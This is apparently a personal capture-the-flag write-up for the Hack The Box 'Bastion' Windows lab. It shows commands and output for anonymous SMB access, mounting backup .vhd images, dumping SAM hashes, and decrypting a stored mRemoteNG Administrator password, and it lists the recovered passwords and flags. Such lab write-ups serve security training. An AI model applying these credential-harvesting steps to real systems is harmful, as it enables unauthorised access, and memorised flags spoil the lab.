# HTB: Bastion
- Date Completed: July 22, 2025
- Difficulty: Easy (Windows)
- Methodology: SMB enumeration → .vhd mount → hash extraction → mRemoteNG → privilege escalation

#RECON

Starting with a quick Nmap scan: 

kali@kali:~/HTB/CTF$ sudo nmap -sS --top-ports 1000 10.129.136.29                                   

PORT     STATE SERVICE
22/tcp   open  ssh
445/tcp  open  microsoft-ds

#FOOTHOLD VIA SMB

Seeing port 445 is open:

kali@kali:~/HTB/CTF$ smbclient -L //10.129.136.29 -N                                                

        Sharename       Type      Comment
        ---------       ----      -------
        Backups         Disk      

We attempt to connect to Backups anonymously:

kali@kali:~/HTB/CTF$ smbclient //10.129.136.29/Backups -N                                        
Try "help" to get a list of possible commands.
smb :\>

Upon enumeration we found a pair of .vhd files:

\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 07:44:02 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 07:44:03 2019

#MOUNTING .VHD FILES AND EXTRACTING HASHES

After mounting the .vhd file, we extracted the SAM and SYSTEM hives to retrieve local account password hashes using secretsdump.py:

Decrypted password: bureaulampje

Using those credentials we attempt to connect through the open SSH port:

#SYSTEM FOOTHOLD

kali@kali:~/HTB/CTF/BaS710n$ ssh l4mpje@10.129.136.29                                               
l4mpje@10.129.136.29's password:                                                 

l4mpje@BASTION C:\Users\L4mpje>                                                                    

Navigating to the Desktop directory we find the user.txt file:

l4mpje@BASTION C:\Users\L4mpje\Desktop>dir                                                        
21-07-2025  23:00                34 user.txt                                                  

user.txt file's contents:

l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                                
d16bf9b61c42e63bcd99e31d735c7429  

#PRIVESC

Next we check for any third party programs installed to escalate privileges:

l4mpje@BASTION C:\>cd C:\Progra~2                                                                   
                                                                                                    
l4mpje@BASTION C:\PROGRA~2>dir                                                                      
 
22-02-2019  15:01    <DIR>          mRemoteNG  

We find mRemoteNG is installed, doing some research there should be a confCons.xml file containging user encypted passwords:

l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml                          
Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" 

Doing more research we need the tool: mremoteng_decrypt.py

kali@kali:~/HTB/CTF/BaS710n$ git clone https://github.com/kmahyyg/mremoteng-decrypt.git              

Using mremoteng-decrypt.py:

kali@kali:~/HTB/CTF/BaS710n/mremoteng-decrypt$ python3 mremoteng_decrypt.py -f ../admin-hash.txt     
Password: thXLHM96BeKL0ER2

#PWNED

We finally ssh in as the admin user:
                                                                                                     
kali@kali:~/HTB/CTF/BaS710n/mremoteng-decrypt$ ssh administrator@10.129.136.29                       
administrator@10.129.136.29's password: 

Microsoft Windows [Version 10.0.14393]                                                               
(c) 2016 Microsoft Corporation. All rights reserved.                                                 

administrator@BASTION C:\Users\Administrator>

And obtain the root.txt file:

administrator@BASTION C:\Users\Administrator\Desktop>type root.txt                                   
f72447b6bc0d77ec544fccebfc87b8e8

#FLAGS
user.txt: d16bf9b61c42e63bcd99e31d735c7429
root.txt: f72447b6bc0d77ec544fccebfc87b8e8

#SUMMARY
This box reinforced Windows privilege escalation through credential harvesting from .vhd backups and 3rd-party application misconfiguration (mRemoteNG). Tools used: nmap, smbclient, guestmount, secretsdump.py, mremoteng_decrypt.py.
